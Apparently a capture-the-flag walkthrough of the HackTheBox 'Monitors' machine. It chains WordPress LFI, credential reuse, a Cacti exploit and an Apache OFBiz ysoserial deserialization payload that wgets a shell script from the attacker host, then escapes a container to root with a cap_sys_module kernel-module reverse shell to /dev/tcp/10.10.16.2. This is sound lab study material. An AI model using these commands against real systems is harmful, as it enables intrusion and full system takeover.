![[Pasted image 20250429231533.png]]
[[Nmap]] scan only report [[port 80]] and [[port 22]] opens, on port 80 we found web applications with [[Wordpress]], we use [[wpscan]] to enumerate that wordpress and found a plugin [[wp-with-spritz]]. Searching with [[searchsploit]] we found a vulnerability to can read local files [[Local File Inclusion (LFI)]] sending a parameter `url` to plugin

![[Pasted image 20250429232103.png]]

we can read the `/etc/passwd`.

with the next expression we can get only the port in hex format.

```bash
for port in $(curl -s 'http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/proc/net/tcp' | awk '{print $2}' | grep -v local | awk '{print $2}' FS=":" ); do echo "[+] Port $port: $(echo "obase=10; ibase=16; $port" | bc)"; done
```

![[Pasted image 20250429235651.png]]
we get that ports opens.

Major of worpress have a config file called `wp-config.php` where we can find something:

![[Pasted image 20250430000735.png]]

and yes, we get a credentials but are the [[MySQL]] database. Let's continue with enumeration.

[[whatweb]] reports the server are running a [[apache2]], and this have some config files interesting in the next paths:

`/etc/apache2/sites-enabled/000-default.conf`

![[Pasted image 20250430000247.png]]

And we get important information, focus on `cacti-admin.monitors.htb.conf`

Let's go there.

![[Pasted image 20250430000905.png]]

we find a admin panel, if we try with `MySQL` database

![[Pasted image 20250430001700.png]]

we in.

we can use [[searchsploit]] again to try find exploit targeting cacti version 1.2.12

![[Pasted image 20250430001805.png]]

![[Pasted image 20250430002338.png]]

and we get access.

on home directory of user `marcus` we found the flag but can't read it, we also find a hidden folder called `.backup`

![[Pasted image 20250430010852.png]]

where we can enter, but not read, we could read the files inside if we get the name right.

If we try search `marcus` user's stuff on each relevant directories starting with `/dev/`:

![[Pasted image 20250430011209.png]]

we look something interesting, the file `backup.sh`, so let's try read it.

![[Pasted image 20250430011300.png]]

we find another credentials.

if we try re use credentials to convert in `marcus` it's done.

![[Pasted image 20250430011616.png]]

we're `marcus`.

with [[netstat]] we can list open ports internally.

```bash
netstat -nat
```

![[Pasted image 20250430012145.png]]

port 8443 it's open. Let's apply a local port forwarding with [[ssh]] to get access to that in our machine.

On the web we not found nothing very interesting, if use [[ffuf]] to apply [[fuzzing]] we get some routes.

![[Pasted image 20250430013204.png]]

if test with `ecommerce` the web redirect us and display this:

![[Pasted image 20250430013434.png]]

Searching deeply by `apache ofbzsetup` we find this:

![[Pasted image 20250430013644.png]]

a deserialization exploit.

the exploit use the tool [[ysoserial]] to create a payload and get remote command execution. It must be taken in mind that in order to generate a payload we need to execute the app with the java jdk 15.

Lets generate the payload:

```bash
java -jar ysoserial-all.jar CommonsBeanutils1 "wget 10.10.16.2:8080/shell.sh -O /tmp/shell.sh" | base64 -w 0
```

before of this, remember have your `shell.sh` prepared and serving that on port `8080`

now, with [[curl]] send the next request:

```bash
curl -s https://localhost:8443/webtools/control/xmlrpc -X POST -d "<?xml version='1.0'?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns='http://ws.apache.org/xmlrpc/namespaces/extensions'>$payload</serializable></value></member></struct></value></param></params></methodCall>" -k -H 'Content-Type:application/xml'
```

Once inside container we use [[linpeas.sh]] to enumerate possibles ways to jump host machine with root.

`linpeas.sh` reports says us the container have [[cap_sys_module]] capabilitie.

![[Pasted image 20250430032334.png]]
with [[capsh]] we can list that capabilitie:

![[Pasted image 20250430032528.png]]

so, to exploit this  capability we going to use a reverse shell in `c` language:

```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.16.2/9001 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

create a `makefile`:

```Makefile
obj-m +=reverse-shell.o
all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

after we have this execute `make` and get a file `reverse-shell.ko`

Listen on port `9001` and pass the file to `insmod`:

![[Pasted image 20250430035217.png]]

and we get a connection as `root`.